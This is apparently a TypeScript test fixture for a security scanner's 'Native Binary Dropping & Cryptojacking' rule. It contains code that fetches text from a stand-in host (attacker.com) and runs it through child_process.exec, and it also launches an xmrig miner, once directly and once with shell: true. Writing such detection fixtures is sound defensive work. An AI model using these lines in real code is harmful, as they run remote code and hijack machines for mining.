// Mock dependencies to avoid TS errors
import * as directCp from 'child_process';
import fetch from 'node-fetch';

async function triggerRule() {
    // Rule 6 : Native Binary Dropping & Cryptojacking
    // Flow 1: fetch -> child_process
    const r6f1 = await fetch('http://attacker.com/payload');
    directCp.exec(await r6f1.text());

    // Flow 2: Miner keyword -> child_process
    directCp.spawn('./xmrig', []);

    // Flow 3: Escalation (shell: true)
    directCp.execFile('./xmrig', [], { shell: true });
}

export {};
